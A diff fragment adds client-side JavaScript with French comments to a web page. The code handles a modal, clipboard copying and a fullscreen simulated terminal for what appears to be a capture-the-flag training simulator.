+      closeModal();
+      $("sim-reset-btn").click();
+    });
+    const modal = $("flag-modal");
+    if (modal) modal.addEventListener("click", function (e) { if (e.target === modal) closeModal(); });
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "Escape" && modal && modal.classList.contains("open")) closeModal();
+    });
+
+    // ---------- copier (délégation globale) ----------
+    function copyText(text, done) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done).catch(function () { fallbackCopy(text); done(); });
+      } else {
+        fallbackCopy(text); done();
+      }
+    }
+    function fallbackCopy(text) {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      ta.style.position = "fixed";
+      ta.style.opacity = "0";
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      try { document.execCommand("copy"); } catch (err) {}
+      document.body.removeChild(ta);
+    }
+    document.addEventListener("click", function (e) {
+      const copyBtn = e.target.closest && e.target.closest(".copy-btn");
+      if (copyBtn) {
+        const text = copyBtn.getAttribute("data-copy") || "";
+        copyText(text, function () {
+          const original = copyBtn.textContent;
+          copyBtn.textContent = "✓";
+          copyBtn.classList.add("copied");
+          setTimeout(function () { copyBtn.textContent = original; copyBtn.classList.remove("copied"); }, 1200);
+        });
+        return;
+      }
+      const chip = e.target.closest && e.target.closest(".finding-chip");
+      if (chip) {
+        const text = chip.getAttribute("data-copy") || "";
+        copyText(text, function () {
+          chip.classList.add("chip-copied");
+          setTimeout(function () { chip.classList.remove("chip-copied"); }, 900);
+        });
+      }
+    });
+
+    // ---------- ouverture / fermeture terminal plein écran ----------
+    function openTerminal() {
+      const fs = $("term-fullscreen");
+      if (!fs) return;
+      fs.style.display = "flex";
+      requestAnimationFrame(function () { fs.classList.add("open"); });
+      document.documentElement.style.overflow = "hidden";
+      setTimeout(function () { try { input.focus({ preventScroll: true }); } catch (e) { input.focus(); } }, 200);
+    }
+    function closeTerminal() {
+      const fs = $("term-fullscreen");
+      if (!fs) return;
+      fs.classList.remove("open");
+      document.documentElement.style.overflow = "";
+      setTimeout(function () { if (!fs.classList.contains("open")) fs.style.display = "none"; }, 240);
+    }
+    $("term-open-btn").addEventListener("click", openTerminal);
+    $("term-close-dot").addEventListener("click", closeTerminal);
+
+    // plein écran navigateur (bouton du header du terminal)
+    function toggleBrowserFullscreen() {
+      const doc = document;
+      const el = doc.documentElement;
+      if (!doc.fullscreenElement && !doc.webkitFullscreenElement) {
+        if (el.requestFullscreen) el.requestFullscreen().catch(function () {});
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      } else {
+        if (doc.exitFullscreen) doc.exitFullscreen().catch(function () {});
+        else if (doc.webkitExitFullscreen) doc.webkitExitFullscreen();
+      }
+    }
+    const fsBtn = $("term-fsbtn");
+    if (fsBtn) fsBtn.addEventListener("click", toggleBrowserFullscreen);
+
+    // ---------- init ----------
+    renderPrompt();
+    renderFindings();
+    renderProgress();
+    renderPhaseTrack();
+    setConsigne();
+  })();
+  </script>
 
 </body>
 </html>
